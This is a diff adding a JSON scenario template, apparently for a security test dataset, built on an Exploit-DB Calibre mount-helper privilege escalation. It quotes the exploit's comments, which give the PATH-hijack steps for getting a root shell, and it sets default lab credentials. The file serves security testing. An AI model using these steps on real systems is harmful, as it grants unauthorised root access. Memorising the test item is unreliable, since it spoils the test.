@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_18064",
+  "category": "B2_path_hijack",
+  "attack_technique": "T1574.007",
+  "cwe": "CWE-426",
+  "description": "Linux privilege escalation: Calibre E-Book Reader - Local Privilege Escalation (1) (OSVDB-76828;OSVDB-76826)\n\nExploit source code (18064.sh):\n```\n#!/bin/sh\n\n                  #######################################\n                  #     .50-Calibrer Assault Mount      #\n                  #              by zx2c4               #\n                  #######################################\n\n################################################################################\n# Calibre uses a suid mount helper, and like nearly all suid mount helpers that\n# have come before it, it's badly broken. Let's go through Calibre's faulty code\n# available at http://pastebin.com/auz9SULi and look at the array of silly\n# things done, only one of which we actually need to get root.\n#\n# In this spot here, we can create a directory owned by root anywhere we want:\n#\n# 47\t    if (!exists(mp)) {\n# 48\t        if (mkdir(mp, S_IRUSR|S_IWUSR|S_IXUSR|S_IRGRP|S_IXGRP|S_IROTH|S_IXOTH) != 0) {\n# 49\t            errsv = errno;\n# 50\t            fprintf(stderr, \"Failed to create mount point with error: %s\\n\", strerror(errsv));\n# 51\t        }\n# 52\t    }\n#\n# At this point, we can remove any empty directory we want:\n#\n# 172\t    rmd = rmdir(mp);\n#\n# And elsewhere, we can create and remove anything_we_want/.some_stupid_marker.\n# I'm sure you can figure out how to exploit these kinds of things :-P.\n#\n# We also get the ability with this wonderful mount-helper to unmount and eject\n# any device that we want (as root), as well as mount any vfat filesystem that\n# we'd like.\n#\n# Not only that, but we can pass params directly to mount, to some degree:\n#\n# 83\t    execlp(\"mount\", \"mount\", \"-t\", \"auto\", \"-o\", options, dev, mp, NULL);\n#\n# On this line, \"dev\" and \"mp\" are controlled by argv[2] and argv[3]. I'm sure\n# you can find fun things to do with this as well. (There -s and also the man\n# pages say the last -o is respected, etc etc. Be creative.)\n#\n# But there's also something lurking that is way worse in this line. Is that\n# \"execlp\" we see? Yes.  According to the man pages:\n#\n#     The execlp(), execvp(), and execvpe() functions duplicate the  actions  of\n#     the  shell  in searching  for  an  executable file if the specified\n#     filename does not contain a slash (/) character.\n#\n# execlp searchs PATH for where to find \"mount\", and then runs it as root. And,\n# with great joy, we find that we can trivially control PATH by setting it\n# before running the mount helper. So the attack plan is simple:\n#\n#    1. Make an executable named \"mount\" in the current directory that executes\n#       a shell.\n#    2. PATH=\".:$PATH\" calibre-mount-helper mount something somethingelse\n#\n# And that's it! We have root. The below exploit creates things in a temporary\n# directory that gets cleaned up and displays some status information along the\n# way.\n#\n# - zx2c4\n# 2011-11-1\n#\n# Usage:\n# $ ./50calibrerassaultmount.sh\n# [+] Making temporary directory: /tmp/tmp.q5ktd8UcxP\n# [+] Making mount point.\n# [+] Writing malicious mounter.\n# [+] Overriding PATH and getting root.\n# [+] Cleaning up: /tmp/tmp.q5ktd8UcxP\n# [+] Checking root: uid=0(root) gid=0(root) groups=\n```",
+  "cve": "OSVDB-76828;OSVDB-76826",
+  "exploitdb_id": "18064",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_18064",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
